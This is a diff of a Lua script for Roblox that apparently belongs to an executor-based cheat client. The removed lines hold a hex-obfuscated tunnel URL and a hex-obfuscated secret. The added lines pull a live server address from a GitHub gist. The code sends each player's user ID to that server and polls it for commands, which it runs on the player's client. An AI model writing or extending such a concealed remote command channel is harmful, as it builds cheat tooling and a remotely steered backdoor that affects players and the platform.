@@ -194,26 +194,40 @@ task.wait(0.1)
 
 do
 	local _req = (syn and syn.request) or (http_request and function(t) return http_request(t) end) or request or function() return {Body='{"tier":0}'} end
-    local function _bu()
-        local _s = {
-            '68','74','74','70','73','3a','2f','2f','65','78','61','6d','69','6e','65',
-            '2d','70','72','69','6f','72','69','74','69','65','73','2d','6e','69','67',
-            '68','74','73','2d','77','68','6f','6c','65','2e','74','72','79','63','6c',
-            '6f','75','64','66','6c','61','72','65','2e','63','6f','6d','2f','77','68',
-            '69','74','65','6c','69','73','74'
-        }
-        local _r = '' for _,v in _s do _r = _r .. string.char(tonumber(v,16)) end return _r
-    end
+	local _CONFIG_URL = 'https://gist.githubusercontent.com/poopparty/a817668f8805b6d44fa54ff13dc8edf4/raw/url.txt'
+
+	local _liveUrl = nil
+	local function _getUrl()
+		if _liveUrl then return _liveUrl end
+		local ok, res = pcall(function()
+			return _req({
+				Url = _CONFIG_URL,
+				Method = 'GET',
+				Headers = { ['Cache-Control'] = 'no-cache' }
+			})
+		end)
+		if ok and res and res.Body and res.StatusCode == 200 then
+			local url = res.Body:match('^%s*(.-)%s*$')
+			if url ~= '' then
+				_liveUrl = url
+				return _liveUrl
+			end
+		end
+		return nil
+	end
+
 	local function _ft(uid)
 		local result = 0
 		local done = false
 		task.spawn(function()
+			local url = _getUrl()
+			if not url then done = true return end
 			local ok, res = pcall(function()
 				return _req({
-					Url = _bu(),
+					Url = url,
 					Method = 'POST',
-					Headers = {['Content-Type']='application/json',['ngrok-skip-browser-warning']='true'},
-					Body = httpService:JSONEncode({action='check',roblox_id=tostring(uid),robloxUserId=tostring(uid)})
+					Headers = { ['Content-Type'] = 'application/json' },
+					Body = httpService:JSONEncode({ action = 'check', robloxUserId = tostring(uid), roblox_id = tostring(uid) })
 				})
 			end)
 			if ok and res and res.Body and res.Body ~= '' and not (res.StatusCode and res.StatusCode >= 500) then
@@ -223,7 +237,7 @@ do
 			done = true
 		end)
 		local t = tick()
-		repeat task.wait(0.1) until done or (tick() - t > 5)
+		repeat task.wait(0.1) until done or (tick() - t > 8)
 		return result
 	end
 
@@ -251,19 +265,12 @@ do
 	local lagConnections = {}
 	local function _registerCommand(name, fn) _commands[name] = fn end
 
-	local _SERCET = ''
-	local _stok = {'58','37','70','4b','39','6d','51','32','76','52','38','74','59','35','77','5a','33','78','42','36','6e','48','34','6a','4c','39','70','51','32','76','54','38','77','45','35','72','59','39','75','49','33','6f','50','36','61','53','31','64','46','34','67','48','37','6a','4b','39','6d','51','32','76'}
-	local _stmp = ''
-	for _,v in _stok do _stmp = _stmp .. string.char(tonumber(v,16)) end
-	_SERCET = _stmp
-
 	getgenv()._aeroTierReady = false
 	getgenv().getAeroTier = function(player) return 0 end
 
 	task.spawn(function()
 		local lplr = playersService.LocalPlayer
 		_tierCache[lplr.UserId] = _ft(lplr.UserId)
-		getgenv()._aeroTierCache = _tierCache
 		getgenv().getAeroTier = function(player)
 			local t = _tierCache[player.UserId]
 			return type(t) == 'number' and t or 0
@@ -284,12 +291,14 @@ do
 		local nextPoll = 0
 		while pollingActive do
 			if tick() < nextPoll then task.wait(0.5) continue end
+			local url = _getUrl()
+			if not url then nextPoll = tick() + 5 continue end
 			local ok, res = pcall(function()
 				return _req({
-					Url = _bu(),
+					Url = url,
 					Method = 'POST',
-					Headers = {['Content-Type']='application/json',['ngrok-skip-browser-warning']='true'},
-					Body = httpService:JSONEncode({action='getMessage',robloxUserId=tostring(lplr.UserId)})
+					Headers = { ['Content-Type'] = 'application/json' },
+					Body = httpService:JSONEncode({ action = 'getMessage', robloxUserId = tostring(lplr.UserId) })
 				})
 			end)
 			if not ok or not res or not res.Body then nextPoll = tick() + 3 continue end
@@ -301,10 +310,10 @@ do
 				if _commands[cmd] then _commands[cmd](tostring(data.from), data.args or '') end
 				pcall(function()
 					_req({
-						Url = _bu(),
+						Url = url,
 						Method = 'POST',
-						Headers = {['Content-Type']='application/json',['ngrok-skip-browser-warning']='true'},
-						Body = httpService:JSONEncode({action='removeMessage',robloxUserId=tostring(lplr.UserId)})
+						Headers = { ['Content-Type'] = 'application/json' },
+						Body = httpService:JSONEncode({ action = 'removeMessage', robloxUserId = tostring(lplr.UserId) })
 					})
 				end)
 				nextPoll = tick() + 1.5
